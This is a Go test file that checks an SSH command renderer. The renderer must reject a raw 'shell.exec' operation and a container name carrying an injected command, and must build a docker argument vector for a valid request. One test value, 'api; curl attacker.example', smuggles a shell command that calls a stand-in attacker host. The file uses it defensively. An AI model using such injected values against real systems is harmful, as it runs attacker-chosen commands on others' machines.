package ssh

import "testing"

func TestRenderRejectsRawAndInjectedCommands(t *testing.T) {
	if _, err := Render(Request{Operation: Operation("shell.exec")}); err == nil {
		t.Fatal("unknown raw-shell operation was accepted")
	}
	if _, err := Render(Request{
		Operation: OperationContainerLogs,
		Container: "api; curl attacker.example",
		Lines:     100,
	}); err == nil {
		t.Fatal("injected container argument was accepted")
	}
}

func TestRenderProducesArgumentVector(t *testing.T) {
	command, err := Render(Request{
		Operation: OperationContainerLogs,
		Container: "ship-api-1",
		Lines:     50,
	})
	if err != nil {
		t.Fatal(err)
	}
	if command.Program != "docker" || len(command.Args) != 4 || command.Args[3] != "ship-api-1" {
		t.Fatalf("unexpected command: %#v", command)
	}
}
